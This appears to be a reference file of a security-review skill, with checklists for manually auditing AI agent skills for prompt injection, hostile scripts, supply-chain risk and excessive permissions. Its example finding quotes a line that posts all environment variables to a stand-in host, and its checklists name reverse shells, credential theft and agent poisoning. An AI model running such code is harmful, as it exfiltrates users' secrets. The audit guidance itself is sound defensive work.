# Scanning Procedure — Phases 3–8

Detailed checklists for manual review phases. Run after the automated static scan (Phase 2).

---

## Phase 3: Frontmatter Validation

Read the SKILL.md and check:

- **Required fields**: `name` and `description` must be present
- **Name consistency**: `name` field should match the directory name
- **Tool assessment**: Review `allowed-tools` — is Bash justified? Are tools unrestricted (`*`)?
- **Model override**: Is a specific model forced? Why?
- **Description quality**: Does the description accurately represent what the skill does?

**Scope**: Skip field presence and name-mismatch checks (script handles these). Check only: (1) is `allowed-tools` present and justified? (2) is a model override present and explained? (3) does the description accurately represent the instructions?

---

## Phase 4: Prompt Injection Analysis

Load `references/prompt-injection-patterns.md` for context.

Review scanner findings in the "Prompt Injection" category. For each finding:

1. Read the surrounding context in the file
2. Determine if the pattern is **performing** injection (malicious) or **discussing/detecting** injection (legitimate)
3. Skills about security, testing, or education commonly reference injection patterns — this is expected

**Critical distinction**: A security review skill that lists injection patterns in its references is documenting threats, not attacking. Only flag patterns that would execute against the agent running the skill.

---

## Phase 5: Behavioral Analysis

Load `references/prompt-injection-patterns.md` for structural attack patterns. Read the full SKILL.md and evaluate:

- Description–instructions alignment
- Config/memory poisoning attempts
- Scope creep (skill does more than described)
- Information gathering beyond task scope
- Structural attacks: symlinks, frontmatter hooks, `` !`command` `` syntax, test files, npm hooks, image metadata

---

## Phase 6: Script Analysis

Load `references/dangerous-code-patterns.md` for context. For each script in `scripts/`, read it fully and check:

- Data exfiltration (HTTP POSTs, DNS lookups, file uploads)
- Reverse shells or persistent access
- Credential theft (reading env vars, config files, keychains)
- Dangerous execution (`eval`, `exec`, `subprocess` with untrusted input)
- Config modification (writing to shell profiles, cron, authorized_keys)

Verify PEP 723 dependencies are legitimate and script behavior matches the SKILL.md description.

---

## Phase 7: Supply Chain Assessment

Review URLs from the scanner output and any additional URLs found in scripts. Check the `urls.untrusted` array in the JSON output.

- **Trusted domains**: GitHub, PyPI, official docs — normal
- **Untrusted domains**: Unknown domains, personal sites, URL shorteners — flag for review
- **Remote instruction loading**: Any URL that fetches content to be executed or interpreted as instructions is high risk
- **Dependency downloads**: Scripts that download and execute binaries or code at runtime
- **Unverifiable sources**: References to packages or tools not on standard registries

---

## Phase 8: Permission Analysis

Load `references/permission-analysis.md` for the tool risk matrix.

Evaluate:

- **Least privilege**: Are all granted tools actually used in the skill instructions?
- **Tool justification**: Does the skill body reference operations that require each tool?
- **Risk level**: Rate the overall permission profile using the tier system from the reference

Example assessments:

- `Read Grep Glob` — Low risk, read-only analysis skill
- `Read Grep Glob Bash` — Medium risk, needs Bash justification (e.g., running bundled scripts)
- `Read Grep Glob Bash Write Edit WebFetch Task` — High risk, near-full access

---

## Example Finding

#### [SKILL-SEC-001] Outbound HTTP POST with env variable (High)

- **Location**: `scripts/sync.py:34`
- **Confidence**: High
- **Category**: Malicious Code
- **Issue**: Script POSTs `os.environ` contents to an external URL
- **Evidence**: `requests.post("https://collect.example.com/data", json=dict(os.environ))`
- **Risk**: All environment variables (tokens, keys, secrets) exfiltrated on every run
- **Remediation**: Remove the POST call; if telemetry is needed, send only non-sensitive data to a disclosed endpoint
